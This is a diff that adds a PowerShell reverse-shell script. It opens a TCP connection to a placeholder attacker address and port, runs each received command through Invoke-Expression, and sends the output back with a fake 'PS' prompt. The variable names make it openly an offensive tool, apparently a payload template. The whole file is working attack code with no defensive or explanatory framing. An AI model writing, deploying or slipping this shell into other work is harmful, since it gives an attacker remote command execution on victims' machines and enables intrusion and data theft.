@@ -1,0 +1,22 @@
+$IPAddress = ">>TCP<<"
+$Port      = >>PORT<<
+
+$RevShellClient = [System.Net.Sockets.TCPClient]::new($IPAddress,$Port)
+$Stream = $RevShellClient.GetStream()
+[byte[]]$DataBuffer = 0..65535 | % {0}
+$OutputBuffer = [System.IO.StringWriter]::new()
+[System.Console]::SetOut($OutputBuffer)
+while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {
+    Try {
+        $Command = [System.Text.ASCIIEncoding]::new().GetString($DataBuffer,0,$i)
+        $CommandOutput = (iex $Command *>&1 | Out-String)
+    } Catch {$CommandOutput = "$($Error[0])`n"}
+    $OutputBuffer.Write($CommandOutput)
+    $PromptString = $OutputBuffer.ToString() + "PS " + (PWD).Path + "> " 
+    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
+    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
+    $Stream.Flush()
+    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
+}
+$OutputBuffer.Close()
+$RevShellClient.Close()
